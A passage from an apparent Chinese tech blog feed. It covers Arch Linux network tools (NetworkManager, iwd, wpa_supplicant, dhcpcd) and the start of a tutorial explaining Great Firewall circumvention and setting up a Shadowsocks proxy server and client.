title="安装">安装</a> <a href="https://archlinux.org/packages/?name=rp-pppoe">rp-pppoe</a>包 以支持 PPPoE &#x2F; DSL 连接。使用 <code>nm-connection-editor</code> 添加一个新的 DSL&#x2F;PPPoE 连接。</p><h4 id="3-VPN-支持"><a href="#3-VPN-支持" class="headerlink" title="3.VPN 支持"></a>3.VPN 支持</h4><p>从 1.16 版本开始 NetworkManager 原生支持 <a href="https://wiki.archlinuxcn.org/wiki/WireGuard" title="WireGuard">WireGuard</a>，它只需要 <code>wireguard</code> 内核模块。详见 <a href="https://blogs.gnome.org/thaller/2019/03/15/wireguard-in-networkmanager/">WireGuard in NetworkManager 博客文章</a>。</p><p>对其他类型 VPN 的支持基于一个插件系统。它们在以下软件包中提供：</p><ul><li><a href="https://archlinux.org/packages/?name=networkmanager-openconnect">networkmanager-openconnect</a>包 支持 <a href="https://wiki.archlinuxcn.org/wzh/index.php?title=OpenConnect&action=edit&redlink=1" title="OpenConnect（页面不存在）">OpenConnect</a></li><li><a href="https://wiki.archlinuxcn.org/wzh/index.php?title=Networkmanager-openvpn&action=edit&redlink=1" title="Networkmanager-openvpn（页面不存在）">networkmanager-openvpn</a> 支持 <a href="https://wiki.archlinuxcn.org/wiki/OpenVPN" title="OpenVPN">OpenVPN</a></li><li><a href="https://archlinux.org/packages/?name=networkmanager-pptp">networkmanager-pptp</a>包 支持 <a href="https://wiki.archlinuxcn.org/wiki/PPTP_Client" title="PPTP Client">PPTP Client</a></li><li><a href="https://archlinux.org/packages/?name=networkmanager-strongswan">networkmanager-strongswan</a>包 支持 <a href="https://wiki.archlinuxcn.org/wiki/StrongSwan" title="StrongSwan">strongSwan</a></li><li><a href="https://archlinux.org/packages/?name=networkmanager-vpnc">networkmanager-vpnc</a>包</li><li><a href="https://aur.archlinux.org/packages/networkmanager-fortisslvpn-git/">networkmanager-fortisslvpn-git</a>AUR</li><li><a href="https://aur.archlinux.org/packages/networkmanager-iodine-git/">networkmanager-iodine-git</a>AUR</li><li><a href="https://aur.archlinux.org/packages/networkmanager-libreswan/">networkmanager-libreswan</a>AUR</li><li><a href="https://archlinux.org/packages/?name=networkmanager-l2tp">networkmanager-l2tp</a>包</li><li><a href="https://aur.archlinux.org/packages/networkmanager-ssh-git/">networkmanager-ssh-git</a>AUR</li><li><a href="https://archlinux.org/packages/?name=network-manager-sstp">network-manager-sstp</a>包</li></ul><h4 id="4-GUI界面"><a href="#4-GUI界面" class="headerlink" title="4.GUI界面"></a>4.GUI界面</h4><ul><li><a href="https://archlinux.org/packages/?name=nm-connection-editor">nm-connection-editor</a>包 提供图形界面；</li><li><a href="https://archlinux.org/packages/?name=network-manager-applet">network-manager-applet</a>包 提供系统托盘图标（<code>nm-applet</code>）。</li></ul><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S networkmanager</span><br><span class="line"><span class="comment">#此软件包包含一个守护程序、一个命令行界面（`nmcli`）和一个基于 curses 的界面（`nmtui`）。</span></span><br></pre></td></tr></table></figure><h3 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h3><h4 id="1-nmcli"><a href="#1-nmcli" class="headerlink" title="1.nmcli"></a>1.nmcli</h4><h5 id="1-常用的命令"><a href="#1-常用的命令" class="headerlink" title="1.常用的命令"></a>1.常用的命令</h5><p>1.显示附近的 Wi-Fi 网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli device wifi list</span><br></pre></td></tr></table></figure><p>2.连接到 Wi-Fi 网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli device wifi connect _SSID_或_BSSID_ password _密码_</span><br></pre></td></tr></table></figure><p>3.连接到隐藏的 Wi-Fi 网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli device wifi connect _SSID_或_BSSID_ password _密码_ hidden <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>4.连接到 <code>wlan1</code> 网络接口上的 Wi-Fi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli device wifi connect _SSID_或_BSSID_ password _密码_ ifname wlan1 _profile_name_</span><br></pre></td></tr></table></figure><p>5.断开网络接口上的连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli device disconnect ifname eth0</span><br></pre></td></tr></table></figure><p>6.显示连接列表及其名称、UUID、类型和支持设备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection show</span><br></pre></td></tr></table></figure><p>7.激活连接（即使用现有配置文件连接到网络）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection up _name_或_uuid_</span><br></pre></td></tr></table></figure><p>8.删除连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection delete _name_或_uuid_</span><br></pre></td></tr></table></figure><p>9.显示所有网络设备及其状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli device</span><br></pre></td></tr></table></figure><p>10.关闭 Wi-Fi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli radio wifi off</span><br></pre></td></tr></table></figure><h5 id="2-编辑连接"><a href="#2-编辑连接" class="headerlink" title="2.编辑连接"></a>2.编辑连接</h5><p>1.获取连接列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection</span><br></pre></td></tr></table></figure><p>2.nmcli交互式编辑器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`nmcli connection edit <span class="string">&#x27;Wired connection 2&#x27;</span>`.</span><br></pre></td></tr></table></figure><p>3.nmcli命令行界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection modify <span class="string">&#x27;Wired connection 2&#x27;</span> _setting_._property_ _value_</span><br></pre></td></tr></table></figure><p>连接文件<br>&#x2F;etc&#x2F;NetworkManager&#x2F;system-connections&#x2F;<br>4.重载连接文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmcli connection reload</span><br></pre></td></tr></table></figure><h4 id="2-nmtui"><a href="#2-nmtui" class="headerlink" title="2.nmtui"></a>2.nmtui</h4><p>nmtui为networkmanager的交互式图形化管理工具</p><h2 id="3-iwd"><a href="#3-iwd" class="headerlink" title="3.iwd"></a>3.iwd</h2><h3 id="1-描述-2"><a href="#1-描述-2" class="headerlink" title="1.描述"></a>1.描述</h3><p><a href="https://iwd.wiki.kernel.org/">iwd</a> (iNet wireless daemon，iNet 无线守护程序) 是由英特尔（Intel）为 Linux 编写的一个无线网络守护程序。该项目的核心目标是不依赖任何外部库，而是最大程度地利用 Linux 内核提供的功能来优化资源利用。</p><p>iwd 可以独立工作，也可以和 <a href="https://wiki.archlinuxcn.org/wiki/ConnMan" title="ConnMan">ConnMan</a>、<a href="https://wiki.archlinuxcn.org/wiki/Systemd-networkd" title="Systemd-networkd">systemd-networkd</a> 和 <a href="https://wiki.archlinuxcn.org/wiki/NetworkManager#Using_iwd_as_the_Wi-Fi_backend" title="NetworkManager">NetworkManager</a> 这样更完善的网络管理器结合使用。</p><h3 id="2-安装-1"><a href="#2-安装-1" class="headerlink" title="2.安装"></a>2.安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S iwd</span><br><span class="line"><span class="comment">#iwd软件包 软件包提供了客户端程序 `iwctl`、守护程序 `iwd` 和 WiFi 监控工具 `iwmon`</span></span><br><span class="line"><span class="comment">#[iwgtk]CNRepo 提供 iwd 的 GUI 前端和托盘图标。</span></span><br></pre></td></tr></table></figure><h3 id="3-使用-1"><a href="#3-使用-1" class="headerlink" title="3.使用"></a>3.使用</h3><h4 id="1-iwctl"><a href="#1-iwctl" class="headerlink" title="1.iwctl"></a>1.iwctl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入交互式命令行</span></span><br><span class="line">iwctl</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看帮助</span></span><br><span class="line">[iwd]<span class="comment"># help</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#首先，如果不知道你的网络设备名称，请列出所有 WiFi 设备：</span></span><br><span class="line">[iwd]<span class="comment"># device list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后，要开始扫描网络（注意：这个命令不会输出任何内容），执行：</span></span><br><span class="line">[iwd]<span class="comment"># station device scan</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再然后，就可以列出所有可用的网络：</span></span><br><span class="line">[iwd]<span class="comment"># station device get-networks</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后，要连接到一个网络</span></span><br><span class="line">[iwd]<span class="comment"># station device connect SSID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果要求输入网络密码，将会提示用户输入。此外，连接操作可以应用成命令行参数的形式：</span></span><br><span class="line">iwctl --passphrase passphrase station device connectSSID</span><br><span class="line"></span><br><span class="line"><span class="comment">#要断开网络连接：</span></span><br><span class="line">[iwd]<span class="comment"># station device disconnect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要显示 WiFi 设备详细情况，比如 MAC 地址：</span></span><br><span class="line">[iwd]<span class="comment"># device device show</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要显示包括 WiFi 设备的连接网络在内的连接状态：</span></span><br><span class="line">[iwd]<span class="comment"># station device show</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要列出以前连接过的网络：</span></span><br><span class="line">[iwd]<span class="comment"># known-networks list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要忘记已知的网络：</span></span><br><span class="line">[iwd]<span class="comment"># known-networks SSID forget</span></span><br></pre></td></tr></table></figure><h2 id="4-wpa-supplicant"><a href="#4-wpa-supplicant" class="headerlink" title="4.wpa_supplicant"></a>4.wpa_supplicant</h2><h3 id="1-描述-3"><a href="#1-描述-3" class="headerlink" title="1.描述"></a>1.描述</h3><p><a href="https://hostap.epitest.fi/wpa_supplicant/">wpa_supplicant</a> 是跨平台的 WPA <a href="https://en.wikipedia.org/wiki/Supplicant_(computer)" title="wikipedia:Supplicant (computer)">请求者程序（supplicant）</a>，支持 WEP、WPA 和 WPA2(<a href="https://en.wikipedia.org/wiki/IEEE_802.11i-2004" title="wikipedia:IEEE 802.11i-2004">IEEE 802.11i</a>).。可以在桌面、笔记本甚至嵌入式系统中使用。</p><h3 id="2-安装-2"><a href="#2-安装-2" class="headerlink" title="2.安装"></a>2.安装</h3><p><a href="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85" title="安装">安装</a> <a href="https://archlinux.org/packages/?name=wpa_supplicant">wpa_supplicant</a>包 软件包。此软件包提供了主程序 _wpa_supplicant_，密码工具 <em>wpa_passphrase</em> 和文字界面前端 <em>wpa_cli</em>.</p><p>此外软件包 <a href="https://aur.archlinux.org/packages/wpa_supplicant_gui/">wpa_supplicant_gui</a>AUR 提供了图形界面 _wpa_gui_。 <a href="https://aur.archlinux.org/packages/wpa-cute/">wpa-cute</a>AUR 是 <em>wpa_gui</em> 的一个分支，提供了额外的修正和改进。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S wpa_supplicant</span><br></pre></td></tr></table></figure><h3 id="3-使用-2"><a href="#3-使用-2" class="headerlink" title="3.使用"></a>3.使用</h3><p>配置文件<br>&#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=/run/wpa_supplicant</span><br><span class="line">update_config=1</span><br></pre></td></tr></table></figure><p>连接网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpa_supplicant -B -i _interface_ -c /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure><p>生成配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpa_passphrase MYSSID passphrase &gt; /etc/wpa_supplicant/example.conf</span><br></pre></td></tr></table></figure><h2 id="5-dhcpcd"><a href="#5-dhcpcd" class="headerlink" title="5.dhcpcd"></a>5.dhcpcd</h2><h3 id="1-描述-4"><a href="#1-描述-4" class="headerlink" title="1.描述"></a>1.描述</h3><p><em>hcpcd</em> 是 DHCP 和 DHCPv6 客户端，是目前功能最丰富的开源 DHCP 客户端。<a href="https://roy.marples.name/projects/dhcpcd">项目主页</a>包含了完整的功能列表。</p><h3 id="2-安装-3"><a href="#2-安装-3" class="headerlink" title="2.安装"></a>2.安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S dhcpcd</span><br></pre></td></tr></table></figure><h3 id="3-使用-3"><a href="#3-使用-3" class="headerlink" title="3.使用"></a>3.使用</h3><h4 id="1-获取ip地址"><a href="#1-获取ip地址" class="headerlink" title="1.获取ip地址"></a>1.获取ip地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取ip地址</span></span><br><span class="line">dhcpcd</span><br></pre></td></tr></table></figure><h4 id="2-设置静态IP地址"><a href="#2-设置静态IP地址" class="headerlink" title="2. 设置静态IP地址"></a>2. 设置静态IP地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/dhcpcd.conf</span><br><span class="line"></span><br><span class="line">interface eth0</span><br><span class="line">static ip_address=192.168.0.10/24</span><br><span class="line">static routers=192.168.0.1</span><br><span class="line">static domain_name_servers=192.168.0.1 8.8.8.8</span><br></pre></td></tr></table></figure><h4 id="3-设置回落地址"><a href="#3-设置回落地址" class="headerlink" title="3.设置回落地址"></a>3.设置回落地址</h4><p>在dhcp续约失败时，会启用此ip配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/dhcpcd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># define static profile</span></span><br><span class="line">profile static_eth0</span><br><span class="line">static ip_address=192.168.1.23/24</span><br><span class="line">static routers=192.168.1.1</span><br><span class="line">static domain_name_servers=192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># fallback to static profile on eth0</span></span><br><span class="line">interface _eth0_</span><br><span class="line">fallback static_eth0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>科学上网技术原理和及配置教程</title>
      <link href="/2022/12/22/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%8F%8A%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
      <url>/2022/12/22/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%8F%8A%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="科学上网技术原理及配置教程"><a href="#科学上网技术原理及配置教程" class="headerlink" title="科学上网技术原理及配置教程"></a>科学上网技术原理及配置教程</h1><h2 id="1-什么是科学上网"><a href="#1-什么是科学上网" class="headerlink" title="1.什么是科学上网?"></a>1.什么是科学上网?</h2><p>由于中国大陆的一些政治原因，我们上国际互联网的流量在出国的时候一般会受到政府的审查。(其他的国家没有上网流量审查，中国特有，上国内的网站不会被屏蔽)，类似于google，facebook，twitter的一些网站一般会都会被政府的屏蔽，导致我们在中国大陆是无法直接访问这些被屏蔽的网站的，因此我们需要借助一些特别的技术手段实现访问这些被屏蔽的网站<br>我们通常上网的流量在访问国际互联网首先要经过政府的流量审查设备GFW(Great FireWall)，因此我们要访问那些被屏蔽的网站，如google，首先就要过GFW这一关<br>要绕过GFW我们首先要明白GFW的工作原理</p><ul><li>GFW工作原理<br>GFW通常通过域名、IP、关键字等进行流量审查(但不仅限于这些手段)，因此我们要绕过GFW就要绕过GFW就要借助这些特点<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line"> 用户-&gt;&gt; GFW:访问google</span><br><span class="line"> GFW --&gt;&gt; Google: 丢弃数据包</span><br></pre></td></tr></table></figure>如果我们使用科学上网一般是这样的<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">用户 -&gt;&gt; GFW:访问代理服务器</span><br><span class="line">GFW -&gt;&gt; 代理服务器: (正常访问)</span><br><span class="line">代理服务器 -&gt;&gt; Google: (访问成功)</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-常用的科学上网手段"><a href="#2-常用的科学上网手段" class="headerlink" title="2.常用的科学上网手段"></a>2.常用的科学上网手段</h2><ul><li><p>VPN<br>VPN(Virtual Private Network)虚拟专用网络，一般用于企业中为了实现多地区组网实现加密通讯的一种协议。正是由于VPN加密的特点，使得VPN可以用于科学上网，不过近些年由于GFW的不断升级，GFW现如今很容易识别到VPN流量，因此现如今使用VPN实现科学上网的方式并不安全。</p></li><li><p>Shadowsocks协议<br>一种简单的基于socks5代理方式的加密传输协议，最早由clowwindy为了实现科学上网而开发，轻量而且抗封锁</p></li><li><p>ShadowosocksR协议<br>Shadowsocks协议的加强版本</p></li><li><p>VMess协议<br>VMess协议是v2ray原创的加密通讯协议(也是为了实现科学上网)</p></li><li><p>VLess协议<br>VLESS是一种无状态的轻量级数据传输协议，被定义为下一代V2ray数据传输协议。</p></li><li><p>Trojan协议<br>Trojan使用TLS加密模式模仿互联网最常见的https流量，以逃过防火墙的识别。</p></li><li><p>hyster*</p></li></ul><h2 id="3-详细技术原理"><a href="#3-详细技术原理" class="headerlink" title="3.详细技术原理"></a>3.详细技术原理</h2><p>1.以shadowsocks为例<br>shadowsocks程序中有两个核心程序分别为ss-server和ss-local</p><p>整个工作流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">client--&gt;|socks5|ss-local</span><br><span class="line">ss-local--crypto--&gt;ss-server</span><br><span class="line">ss-server--decrypto--&gt;destination_site</span><br><span class="line">destination_site--&gt;ss-server</span><br><span class="line">ss-server--&gt;|crypto|ss-local</span><br><span class="line">ss-local--&gt;|decrypto|client</span><br></pre></td></tr></table></figure><p>1.客户端需要代理的程序首先将需要代理的流量封装成socks5数据包发送给本地代理客户端ss-local</p><p>2.ss-local接收到来自客户端程序发送来的流量之后，将数据包解封装还原成原始流量，并将数据包重新封装成shadowsocks数据包，并将数据包进行加密，发送给远程shdowsocks服务器ss-server。</p><p>3.ss-server接收到ss-local客户端发送来的数据后，首先将数据解析，并将数据进行解密，还原成原始数据报文，并根据数据报文中的信息，请求客户端实际需要请求的服务器。</p><p>4.ss-server接收到实际请求的服务器返回来的数据报文，将数据报文首先进行加密，并将数据报文封装成shadowsocks数据包文，发送给远程客户端ss-local。</p><p>5.客户端ss-local接收到数据包后将数据包进行解密，还原数据原始报文，并将数据包文封装成socks5协议数据包返回给实际代理的应用程序。</p><h2 id="4-科学上网服务器部署"><a href="#4-科学上网服务器部署" class="headerlink" title="4.科学上网服务器部署"></a>4.科学上网服务器部署</h2><p>以下部署环境均基于Ubuntu-20.04环境进行部署</p><h3 id="1-shadowsocks"><a href="#1-shadowsocks" class="headerlink" title="1.shadowsocks"></a>1.shadowsocks</h3><h4 id="1-1-shadowsocks服务端"><a href="#1-1-shadowsocks服务端" class="headerlink" title="1.1 shadowsocks服务端"></a>1.1 shadowsocks服务端</h4><p>1.安装shadowsocks服务文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取源码</span></span><br><span class="line">wget https://github.com/shadowsocks/shadowsocks-libev/releases/download/v3.3.5/shadowsocks-libev-3.3.5.tar.gz</span><br><span class="line"><span class="comment">#编译完得到ss-server可执行文件</span></span><br></pre></td></tr></table></figure><p>2.修改配置文件(服务端)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;::0&quot;</span><span class="punctuation">,</span><span class="string">&quot;0.0.0.0&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>        <span class="comment">//监听的地址</span></span><br><span class="line">    <span class="attr">&quot;server_port&quot;</span><span class="punctuation">:</span><span class="number">8388</span><span class="punctuation">,</span>                <span class="comment">//监听的端口</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;chacha20-ietf-poly1305&quot;</span><span class="punctuation">,</span> <span class="comment">//加密算法</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;ExamplePassword&quot;</span><span class="punctuation">,</span>      <span class="comment">//密码</span></span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp_and_udp&quot;</span><span class="punctuation">,</span>              <span class="comment">//模式</span></span><br><span class="line">    <span class="attr">&quot;fast_open&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span>                  <span class="comment">//是否打开fast_open,(fast_open可以减少多次tcp传输数据之前的握手次数。)</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>3.创建service文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/shadowsocks-libev-server@.service</span><br><span class="line"></span><br><span class="line">[Unit]  </span><br><span class="line">Description=Shadowsocks-Libev Custom Client Service <span class="keyword">for</span> %I  </span><br><span class="line">Documentation=man:ss-local(1)  </span><br><span class="line">After=network.target  </span><br><span class="line">  </span><br><span class="line">[Service]  </span><br><span class="line">Type=simple  </span><br><span class="line">User=nobody</span><br><span class="line">Group=nogroup  </span><br><span class="line">LimitNOFILE=32768  </span><br><span class="line">ExecStart=/usr/bin/ss-server -c /etc/shadowsocks-libev/config.json  </span><br><span class="line"></span><br><span class="line">[Install]  </span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="comment">#重载systemd</span></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>4.启动shadowsocks服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start shdowsocks-libev-server@.service</span><br></pre></td></tr></table></figure><h4 id="1-2-shadowsocks客户端"><a href="#1-2-shadowsocks客户端" class="headerlink" title="1.2 shadowsocks客户端"></a>1.2 shadowsocks客户端</h4><p>1.安装shadowsocks服务文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取源码</span></span><br><span class="line">wget https://github.com/shadowsocks/shadowsocks-libev/releases/download/v3.3.5/shadowsocks-libev-3.3.5.tar.gz</span><br><span class="line"><span class="comment">#编译完得到ss-localr可执行文件</span></span><br></pre></td></tr></table></figure><p>2.创建配置文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/shadowsocks-libev/config.json</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span>                <span class="comment">//ss-server的ip地址</span></span><br><span class="line">    <span class="attr">&quot;server_port&quot;</span><span class="punctuation">:</span> <span class="number">8388</span><span class="punctuation">,</span>                   <span class="comment">//ss-server监听的端口</span></span><br><span class="line">    <span class="attr">&quot;local_port&quot;</span><span class="punctuation">:</span> <span class="number">1080</span><span class="punctuation">,</span>                    <span class="comment">//本地提供socks5代理的端口</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ExamplePassword&quot;</span><span class="punctuation">,</span>         <span class="comment">//服务端验证密码</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">300</span><span class="punctuation">,</span>                        <span class="comment">//超时时间</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chacha20-ietf-poly1305&quot;</span>     <span class="comment">//加密方法</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>3.创建service文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/lib/systemd/system/shadowsocks-libev-local@.service</span><br><span class="line"></span><br><span class="line">[Unit]  </span><br><span class="line">Description=Shadowsocks-Libev Custom Client Service <span class="keyword">for</span> %I  </span><br><span class="line">Documentation=man:ss-local(1)  </span><br><span class="line">After=network.target  </span><br><span class="line">  </span><br><span class="line">[Service]  </span><br><span class="line">Type=simple  </span><br><span class="line"><span class="comment"># CapabilityBoundingSet=CAP_NET_BIND_SERVICE  </span></span><br><span class="line">User=nobody  </span><br><span class="line">Group=nogroup  </span><br><span class="line">LimitNOFILE=32768  </span><br><span class="line">ExecStart=/usr/bin/ss-local -c /etc/shadowsocks-libev/config.json  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">[Install]  </span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>4.启动shadowsocks客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart 